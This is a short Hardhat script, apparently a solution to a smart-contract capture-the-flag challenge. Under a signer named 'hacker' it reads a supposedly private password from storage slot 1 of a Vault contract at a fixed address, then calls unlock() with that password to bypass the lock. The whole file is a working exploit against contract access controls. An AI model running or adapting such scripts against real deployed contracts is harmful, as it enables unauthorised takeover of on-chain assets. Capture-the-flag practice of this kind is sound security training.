const { ethers } = require("hardhat");


async function main() {

  const [hacker] = await ethers.getSigners();

  const Vault_Address = '0xe4A56980981621ebf641f0c2B88b307006DB0A94';

  const Vault = await ethers.getContractAt('Vault', Vault_Address);
  
  console.log(`Vault locked = ${await Vault.locked()}`);

  const password = await ethers.provider.getStorageAt(Vault_Address, 1);

  let tx = await Vault.connect(hacker).unlock(password);
  await tx.wait();

  console.log(`\nVault locked = ${await Vault.locked()}`);
  
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
